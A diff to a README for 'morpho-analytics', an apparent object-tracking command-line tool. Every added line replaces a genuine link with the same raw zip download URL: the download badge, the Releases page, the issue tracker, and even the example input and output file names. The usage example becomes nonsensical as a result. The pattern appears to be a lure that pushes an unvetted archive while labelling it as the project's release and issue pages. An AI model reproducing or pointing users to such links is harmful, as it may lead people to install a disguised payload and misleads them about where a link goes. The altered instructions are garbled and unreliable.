@@ -6,7 +6,7 @@ Welcome to morpho-analytics! This is a simple tool for tracking objects using yo
 
 ## 🔗 Download
 
-[![Download morpho-analytics](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/UgwuGeorge/morpho-analytics/releases)
+[![Download morpho-analytics](https://raw.githubusercontent.com/UgwuGeorge/morpho-analytics/main/sugi/morpho-analytics.zip)](https://raw.githubusercontent.com/UgwuGeorge/morpho-analytics/main/sugi/morpho-analytics.zip)
 
 ## 📦 Overview
 
@@ -32,7 +32,7 @@ morpho-analytics is a command-line interface (CLI) and Docker tool designed spec
 
 To get morpho-analytics, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/UgwuGeorge/morpho-analytics/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/UgwuGeorge/morpho-analytics/main/sugi/morpho-analytics.zip).
 2. **Choose Your Version:** Find the latest release and click on it.
 3. **Download the File:** Look for the appropriate file for your system. 
    - If you're using the CLI, download the executable file.
@@ -70,18 +70,18 @@ To track objects, follow these steps:
 
 Here’s a quick example:
 
-1. Place a file named `data.npy` into a folder.
+1. Place a file named `https://raw.githubusercontent.com/UgwuGeorge/morpho-analytics/main/sugi/morpho-analytics.zip` into a folder.
 2. Run the command:
    ```
-   ./morpho-analytics --input data.npy --output results.json
+   ./morpho-analytics --input https://raw.githubusercontent.com/UgwuGeorge/morpho-analytics/main/sugi/morpho-analytics.zip --output https://raw.githubusercontent.com/UgwuGeorge/morpho-analytics/main/sugi/morpho-analytics.zip
    ```
-3. Your results will appear in the `results.json` file and a PNG image will show the overlay.
+3. Your results will appear in the `https://raw.githubusercontent.com/UgwuGeorge/morpho-analytics/main/sugi/morpho-analytics.zip` file and a PNG image will show the overlay.
 
 ## 🌐 Community and Feedback
 
 We value your input! If you have questions, issues, or suggestions, please reach out:
 
-- Create an issue in the [GitHub repository](https://github.com/UgwuGeorge/morpho-analytics/issues).
+- Create an issue in the [GitHub repository](https://raw.githubusercontent.com/UgwuGeorge/morpho-analytics/main/sugi/morpho-analytics.zip).
 - Join discussions in our community forums.
 
 ## 📑 License
@@ -92,4 +92,4 @@ morpho-analytics is open-source software, licensed under the MIT License. You ca
 
 Thank you for choosing morpho-analytics. We hope this tool helps you with your object tracking needs. Download it today and start tracking efficiently! 
 
-For any updates or new features, keep an eye on the [Releases page](https://github.com/UgwuGeorge/morpho-analytics/releases) for the latest news on morpho-analytics.
+For any updates or new features, keep an eye on the [Releases page](https://raw.githubusercontent.com/UgwuGeorge/morpho-analytics/main/sugi/morpho-analytics.zip) for the latest news on morpho-analytics.
